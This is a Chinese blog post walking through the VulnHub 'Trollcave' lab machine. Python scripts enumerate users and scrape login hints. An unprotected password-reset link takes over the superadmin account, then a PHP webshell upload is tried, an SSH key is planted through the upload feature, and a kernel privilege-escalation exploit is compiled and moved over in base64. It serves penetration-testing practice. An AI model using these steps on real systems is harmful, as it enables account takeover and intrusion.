@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="𝐴_𝑌𝑢">
+
+
+
+
+
+<title>vulhub靶机—trollcave | 𝓐_𝚼𝓾ʹ𝒔 𝓑ℓ𝖔𝓰</title>
+
+
+
+    <link rel="icon" href="/image/favicon.svg">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+    <link rel="stylesheet" href="//at.alicdn.com/t/font_1614813_fp9wxdcpr9c.css"
+<meta name="generator" content="Hexo 6.1.0"></head>
+<body>
+    <div class="wrapper">
+        <link rel="stylesheet" href="../fonts/iconfont2/iconfont.css"> 
+
+<header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/"><i class="iconfont icon-zhuye"></i>主页</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">主页</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; 菜单</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">
+                        
+                            <i class="iconfont icon-archives "></i>
+                        
+                        
+                        
+                        
+                        文章
+                    </a>
+                
+                    <a class="menu-item" href="/category">
+                        
+                        
+                            <i class="iconfont icon-categorys "></i>
+                        
+                        
+                        
+                        分类
+                    </a>
+                
+                    <a class="menu-item" href="/tag">
+                        
+                        
+                        
+                            <i class="iconfont icon-tags "></i>
+                        
+                        
+                        标签
+                    </a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">vulhub靶机—trollcave</h1>
+            
+                <div class="post-meta">
+                    
+                        <!--作者:-->
+                        <i class="iconfont icon-user"></i>
+                        <a itemprop="author" rel="author" href="/">𝐴_𝑌𝑢 </a> &nbsp;
+                    
+
+                    
+                        <span class="post-time">
+                        <!--发布时间:-->
+                        <i class="iconfont icon-time"></i>
+                        <a href="#">2022-05-15&nbsp;&nbsp;11:04:30</a> &nbsp;
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                        <!--分类:-->
+                        <i class="iconfont icon-category"></i>
+                            
+                                <a href="/categories/vulhub%E9%9D%B6%E6%9C%BA/">vulhub靶机</a>&nbsp;
+                            
+                        </span>
+                    
+                    
+                    <span id="/2022/05/15/22-0514-02/" class="leancloud-visitors view" data-flag-title="vulhub靶机—trollcave">
+                        <text class="post-meta-item-text">
+                            <!--阅读数:-->
+                            <i class="iconfont icon-view"></i>
+                        </text>
+                        
+                        <text class="leancloud-visitors-count">加载中</text>
+                      </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/trollcave-12,230/">https://www.vulnhub.com/entry/trollcave-12,230/</a></p>
+<p>kali的ip：192.168.43.238 ，靶场的ip：192.168.43.164 </p>
+</blockquote>
+<p>namp扫描 <code>nmap -A -p- 192.168.43.192</code></p>
+<img src="/2022/05/15/22-0514-02/1648690856804-dace3d62-f899-4b35-a5f4-7b5eb684d2ec.png" alt="img" style="zoom:80%;">
+
+<p>然后访问192.168.43.164，发现了king用户对应的id为1。king用户等级为superadmin</p>
+<img src="/2022/05/15/22-0514-02/1648695159359-46bab4b5-f2dc-4ee3-8283-18559d09eef8.png" alt="img" style="zoom:80%;">
+
+<p>我们不断的更改id可以得到不同的用户</p>
+<img src="/2022/05/15/22-0514-02/1648695230200-81de213a-1f6e-4392-bf55-0dd46834eef9.png" alt="img" style="zoom:80%;">
+
+<p>可以用脚本得到所有用户对应的等级</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_userinfo</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    req = requests.get(<span class="string">&quot;http://192.168.43.164/users/%s&quot;</span> %<span class="built_in">id</span>).text</span><br><span class="line">    <span class="comment">#正则匹配req中的&lt;h1&gt;King&#x27;s page&lt;/h1&gt;</span></span><br><span class="line">    username = re.search(<span class="string">&#x27;&lt;h1&gt;(.*?)\&#x27;s&#x27;</span>, req).group(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">#正则匹配&lt;b&gt;Superadmin&lt;/b&gt;</span></span><br><span class="line">    userlevel = re.search(<span class="string">&#x27;\s&lt;b&gt;\s(.*?)\s&lt;/b&gt;&#x27;</span>,req).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span>  username,userlevel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#处理异常，因为实际id是没有0的</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username,userlevel = get_userinfo(i)</span><br><span class="line">        <span class="built_in">print</span>(username+<span class="string">&#x27;:&#x27;</span>+userlevel)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">       </span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">C:\Users\xxy\Documents\pythonProject\venv\Scripts\python.exe C:/Users/xxy/Documents/pythonProject/test.py</span><br><span class="line">King:Superadmin</span><br><span class="line">dave:Admin</span><br><span class="line">dragon:Admin</span><br><span class="line">coderguy:Admin</span><br><span class="line">cooldude89:Moderator</span><br><span class="line">Sir:Moderator</span><br><span class="line">Q:Moderator</span><br><span class="line">teflon:Moderator</span><br><span class="line">TheDankMan:Regular member</span><br><span class="line">artemus:Regular member</span><br><span class="line">MrPotatoHead:Regular member</span><br><span class="line">Ian:Regular member</span><br><span class="line">kev:Member</span><br><span class="line">notanother:Member</span><br><span class="line">anybodyhome:Member</span><br><span class="line">onlyme:Member</span><br><span class="line">xer:Member</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>然后我们用King来登陆时，虽然失败，返回信息如下：</p>
+<img src="/2022/05/15/22-0514-02/1648698008490-a1ed1799-8dc6-4ffc-bbf1-60e2977810e3.png" alt="img" style="zoom:80%;">
+
+<p>用dave用户登陆失败后，返回信息不同于King</p>
+<img src="/2022/05/15/22-0514-02/1648698093439-b836ccf5-b28f-4cc0-9545-2f0ef08c0715.png" alt="img" style="zoom:80%;">
+
+<p>然后可以编写脚本把所有的信息全部记录下来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_userinfo</span>(<span class="params"><span class="built_in">id</span></span>):</span><br><span class="line">    req = requests.get(<span class="string">&quot;http://192.168.43.164/users/%s&quot;</span> %<span class="built_in">id</span>).text</span><br><span class="line">    <span class="comment">#正则匹配req中的&lt;h1&gt;King&#x27;s page&lt;/h1&gt;</span></span><br><span class="line">    username = re.search(<span class="string">&#x27;&lt;h1&gt;(.*?)\&#x27;s&#x27;</span>, req).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> username</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_notice</span>(<span class="params">username</span>):</span><br><span class="line">    data = &#123;<span class="string">&#x27;authenticity_token&#x27;</span>:<span class="string">&#x27;JFINUhyMrsViYfWwxb/IV+D5F9lAgMVX1QgYCaNHgqeesQsQcBZ+S8LZoM8EQ5oKA9di1n7/3MBUaPqpo9+/XQ==&#x27;</span>,<span class="string">&#x27;session[name]&#x27;</span>:username,<span class="string">&#x27;session[password]&#x27;</span>:<span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;commit&#x27;</span>:<span class="string">&#x27;Log in&#x27;</span>&#125;</span><br><span class="line">    cookie=&#123;<span class="string">&#x27;_thirtytwo_session&#x27;</span>:<span class="string">&#x27;RENUUU9veHMwYitxbHFmK2p6T3NhYWxXRVFxS1JTbjZyRW8xWlFOcktlVHkwODlzQ0JyU1hRa2p4NWpUemxMTGk0TjVPYjBkTTNmVWNTSUtVeEZhenc0bmxkSDBZMzBPUzIyMnowUzRVVVJ0d2c0WnRyR3NZaElrS1MrbURmbFI0ZlA1RWIwcFJOaGc3b0t5NFhlRWZBPT0tLTRLRVVROEZ3WGNNZkVXK2Yvb2RYUnc9PQ%3D%3D--d11ea11177d9ea79444f9cd84945b09a1b70d672&#x27;</span>&#125;</span><br><span class="line">    req = requests.post(url=<span class="string">&quot;http://192.168.43.164/login&quot;</span>,data=data,cookies=cookie).text</span><br><span class="line">    <span class="comment">#正则匹配notice</span></span><br><span class="line">    usernotice = re.search(<span class="string">&#x27;notice\&#x27;&gt;(.*?)&lt;/div&gt;&#x27;</span>,req).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span>  username,usernotice</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#处理异常，因为实际id是没有0的</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        username,usernotice = get_notice(get_userinfo(i))</span><br><span class="line">        <span class="built_in">print</span>(username+<span class="string">&#x27;登陆失败结果==》&#x27;</span>+usernotice)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">输出结果：</span><br><span class="line">C:\Users\xxy\Documents\pythonProject\venv\Scripts\python.exe C:/Users/xxy/Documents/pythonProject/test.py</span><br><span class="line">King登陆失败结果==》:)</span><br><span class="line">dave登陆失败结果==》nah lol</span><br><span class="line">dragon登陆失败结果==》Over fire <span class="keyword">and</span> over stone / Over water <span class="keyword">and</span> over bone / Shining out like jewels of light / On a sheet of purest night</span><br><span class="line">coderguy登陆失败结果==》;)</span><br><span class="line">cooldude89登陆失败结果==》i am the dankest</span><br><span class="line">Sir登陆失败结果==》It<span class="string">&#x27;s super secure</span></span><br><span class="line"><span class="string">Q登陆失败结果==》Your normal password</span></span><br><span class="line"><span class="string">teflon登陆失败结果==》swordfish</span></span><br><span class="line"><span class="string">TheDankMan登陆失败结果==》420</span></span><br><span class="line"><span class="string">artemus登陆失败结果==》garden</span></span><br><span class="line"><span class="string">MrPotatoHead登陆失败结果==》you know...</span></span><br><span class="line"><span class="string">Ian登陆失败结果==》a</span></span><br><span class="line"><span class="string">kev登陆失败结果==》mother&#x27;</span>s maiden name</span><br><span class="line">notanother登陆失败结果==》(:</span><br><span class="line">anybodyhome登陆失败结果==》no one <span class="keyword">is</span></span><br><span class="line">onlyme登陆失败结果==》It <span class="keyword">is</span> what it <span class="keyword">is</span></span><br><span class="line">xer登陆失败结果==》fave pronoun</span><br><span class="line"></span><br><span class="line">进程已结束，退出代码为 <span class="number">0</span></span><br></pre></td></tr></table></figure>
+
+<p>在网站浏览时发现网站程序ralis</p>
+<img src="/2022/05/15/22-0514-02/1648817281876-48a2f677-91e8-41fb-8587-0f2f3c131ae6.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0514-02/1648817504873-4dba004e-761b-435a-9499-396896712eb6.png" alt="img" style="zoom:80%;">
+
+</p><p>从翻译结果中得到，我们可以重置密码，但是网站忘了设置重置密码的按钮，要手动实现，通过百度或查阅相关资料可推断出</p>
+<p><code>http://192.168.43.164/password_resets/new</code>访问该链接可重置密码</p>
+<img src="/2022/05/15/22-0514-02/1648817944569-807e7a9b-e584-42a3-82a8-a0210fafd9c4.png" alt="img" style="zoom:80%;">
+
+<p>然后尝试重置King的密码，但是会报错，我们只能修改member用户的密码</p>
+<img src="/2022/05/15/22-0514-02/1648818058238-c4bfb831-6e33-4b49-a469-9f1c78dd642e.png" alt="img" style="zoom:80%;">
+
+<p>这里重置xer用户的密码，然后会提示我们到下面的链接去更改密码</p>
+<img src="/2022/05/15/22-0514-02/1648818120651-7e9931ad-0ebb-4648-81ff-be7d4272b5c2.png" alt="img" style="zoom:80%;">
+
+<p>然后把密码修改为123456789abc</p>
+<img src="/2022/05/15/22-0514-02/1648818170322-ccf461ca-944a-44d8-a611-aa50d7885e27.png" alt="img" style="zoom:80%;">
+
+<p>然后就可以用xer用户登陆到后台</p>
+<img src="/2022/05/15/22-0514-02/1648818204884-7184772b-1bf4-4c11-8362-5237606a969d.png" alt="img" style="zoom:80%;">
+
+<p>发现后台有上传功能，准备一句话木马进行上传</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/12433714/1648818596089-b9968756-2b0b-498e-a6d4-7dd9760dc55c.png" alt="img"></p>
+<p>这里上传失败了，因为xer用户权限太低了，根据前面重置时给出的链接重置超级管理员King的密码</p>
+<img src="/2022/05/15/22-0514-02/1648818639247-0cf66695-88e4-426a-821f-aa78c31fc0fc.png" alt="img" style="zoom:80%;">
+
+<p><code>http://192.168.43.164/password_resets/edit.Ilx7TNUq-sBAtiB-aryGmw?name=King</code></p>
+<p>同理把King的密码改为123456789abc，然后进行登陆，登陆后上传php一句话木马</p>
+<img src="/2022/05/15/22-0514-02/1648819010278-24e2808f-7d2b-422b-ac21-3232073427be.png" alt="img" style="zoom:80%;">
+
+<p>上传发现不能够进行文件上传</p>
+<img src="/2022/05/15/22-0514-02/1648819040172-6ee882d0-ca64-41c7-ae85-64c0efb3ab75.png" alt="img" style="zoom:80%;">
+
+<p>然后去后台中修改</p>
+<img src="/2022/05/15/22-0514-02/1648819969509-f86f808a-2d27-495a-8e5d-e656484baa97.png" alt="img" style="zoom:80%;">
+
+<p>然后进行上传php一句话</p>
+<img src="/2022/05/15/22-0514-02/1648819943196-014b9195-d17d-42ba-ac56-dbe78b74aaaa.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0514-02/1648820052039-56d08350-6195-43b2-a9a3-c0cb4d166881.png" alt="img" style="zoom:80%;">
+
+</p><p>然后进行访问testshell.php</p>
+<img src="/2022/05/15/22-0514-02/1648820176605-2f18387a-b0d0-429d-ad4f-ffc801ff9528.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0514-02/1648820202536-59c39164-2bab-4cb0-a5b0-67539faae373.png" alt="img" style="zoom:80%;">
+
+</p><p>访问存在该文件，但是无法进行解析php。。。</p>
+<img src="/2022/05/15/22-0514-02/1648820245754-3f62f6d6-58e4-494d-8d0d-2f9eaf6ae2c3.png" alt="img" style="zoom:80%;">
+
+<p>可能是上传的路径King下不允许解释，尝试抓包并且文件名看下能否进行上传到其他路径</p>
+<p>在上传时用burp进行抓包</p>
+<img src="/2022/05/15/22-0514-02/1648819692628-d5265a29-1eda-47e8-af84-59acc7bfb74e.png" alt="img" style="zoom:80%;">
+
+<p>我们把尝试进行修改备用名，看下能否上传时更改路径</p>
+<img src="/2022/05/15/22-0514-02/1648820433645-308ce9f6-67e8-4fd2-a7b0-ced5f9c6016a.png" alt="img" style="zoom:80%;">
+
+<p>
+
+<img src="/2022/05/15/22-0514-02/1648820594173-91d727cf-a8eb-49b2-a0f6-7914866753cf.png" alt="img" style="zoom:80%;">
+
+</p><p>但是还是不能够解析，可能就是无法解析。。。</p>
+<p>搜索相关资料可知rails会默认生成一个rails用户，如果该用户存在可以上传authorized_keys到rails用户下的.ssh目录下，这样就可以利用ssh免密码登陆</p>
+<img src="/2022/05/15/22-0514-02/1648821266947-5a52f62b-285d-459e-9704-1dd6d9b465b8.png" alt="img" style="zoom:80%;">
+
+<p><code>ssh-keygen -f rails</code></p>
+<img src="/2022/05/15/22-0514-02/1648822590057-946d19b3-4a2e-4960-bb4f-c210dd483ad2.png" alt="img" style="zoom:80%;">
+
+<p>然后把rails.pub公钥的名称改为authorized_keys</p>
+<img src="/2022/05/15/22-0514-02/1648822685287-d54d7072-22fd-48fa-9c30-b4bf94ea4fe3.png" alt="img" style="zoom:80%;">
+
+<p>把authorized_keys上传到&#x2F;home&#x2F;rails&#x2F;.ssh&#x2F;目录下</p>
+<img src="/2022/05/15/22-0514-02/1648822775974-7c494d98-73fc-42cb-bd57-8e8e478c481d.png" alt="img" style="zoom:80%;">
+
+<p>然后用私钥进行登陆</p>
+<p><code>ssh -i rails rails@192.168.43.164</code></p>
+<img src="/2022/05/15/22-0514-02/1648822992186-f499bfb5-cc24-47d8-bc98-6fdced816192.png" alt="img" style="zoom:80%;">
+
+<p>登陆成功后，我们发现是ubuntu16.04，然后百度看下能不能进行相关提权</p>
+<img src="/2022/05/15/22-0514-02/1648823076640-b8beb6bc-496e-4e1f-bcca-38884438887c.png" alt="img" style="zoom:80%;">
+
+<p>然后依据相关漏洞直接搜索exp进行提权</p>
+<p>因为目标机器上没有gcc，所以我们在kali上编译</p>
+<img src="/2022/05/15/22-0514-02/1648823755634-c48ad96a-8ce2-41fb-b92e-d94265d7bb8e.png" alt="img" style="zoom:80%;">
+
+<p>然后用base64转换再移动到目标机器上</p>
+<p>先进行base64转换</p>
+<img src="/2022/05/15/22-0514-02/1648823956450-ca495f30-59b1-4377-984e-91207a7165a5.png" alt="img" style="zoom:80%;">
+
+<p>然后ssh登陆后的机器上进行操作</p>
+<p>用vi新建并打开一个cvebase64.64文件，然后把刚才的base64的内容复制进去，如果失败出现报错invalid input可能是base64的内容最后没有&#x3D;</p>
+<img src="/2022/05/15/22-0514-02/1648825012644-7c5bfed2-aa49-4a71-808a-1610cab358ce.png" alt="img" style="zoom:80%;">
+
+<p>然后把cvebase64.64再转换为cve</p>
+<img src="/2022/05/15/22-0514-02/1648825087204-62fa8113-13ee-424a-b19b-eedb7331cf8d.png" alt="img" style="zoom:80%;">
+
+<p>然后给cve权限，chmod 777 cve，然后再运行，ememem报错了，提示缺少双引号，估计可能是exp中缺少了双引号</p>
+<img src="/2022/05/15/22-0514-02/1648825466491-614a30d4-216c-4412-9f9b-ca1ba6035789.png" alt="img" style="zoom:80%;">
+
+<p>理论是可以成功的。。。。</p>
+<img src="/2022/05/15/22-0514-02/1648825565493-66782323-142f-47e3-8a35-3d2c505e67ee.png" alt="img" style="zoom:80%;">
+
+        </div>		
+		
+        <section class="post-tags">
+            <div>
+                <span>标签:</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="/">
+                    <i class="iconfont icon-home"></i>
+                    主页
+                </a>
+                <span>· </span>
+                <a href="javascript:window.history.back();">
+                    <i class="iconfont icon-back"></i>
+                    返回
+                </a>
+                
+                
+            </div>
+        </section>
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2022/05/16/22-0516-01/">vulhub靶机—OS-Hax</a>
+            
+            
+            <a class="next" rel="next" href="/2022/05/14/22-0514-01/">PTT</a>
+            
+        </section>
+        <br>
+        
+            <section id="comments" class="comments">
+              <style>
+                  .comments{ margin-top: 30px;}
+                  .v .vlist .vcard .vcontent {padding-top: 0;}
+                  .vcontent p { color:grey; margin-bottom: 10px;}
+                  .v * {line-height: normal;}
+                  .v .vwrap  {border-radius: 0px; padding: 10px;}
+                  .v .vbtn {border-radius: 0px;}
+                  .v code, .v pre {border-radius: 0px;}
+                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
+                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
+                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
+                  .v .vlist .vcard {padding-top: 0;}
+                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
+                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
+              </style>
+              <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+    new Valine({
+        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
+        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
+        placeholder: '想对作者说点什么...',
+        notify: 'false',
+        verify: 'false',
+        avatar: 'retro',
+        visitor: 'true'
+    });
+</script>
+            </section>
+        
+    </article>
+</div>
+
+
+
+<style>
+
+.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }
+
+</style>
+        </div>
+        <footer id="footer" class="footer">
+
+ <div class="copyright">
+
+ <span>© 𝐴_𝑌𝑢
+
+ <!-- 访客数量 -->
+
+ 
+
+ <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<span class="site-uv">
+    | 总访客量:
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>&nbsp;
+
+
+<span class="site-pv">
+    | 总访问量:
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
+</span>
+
+
+ 
+
+ </span>
+
+ </div>
+
+</footer>
+    </div>
+</body>
+</html>
+
+
+	
+
+
+
+<script type="text/javascript" src="\js\jquery.js"></script>
+<script type="text/javascript" src="\js\jquery.min.js"></script>
+
+<script  type="text/javascript" src="\js\snow.js"></script>
+
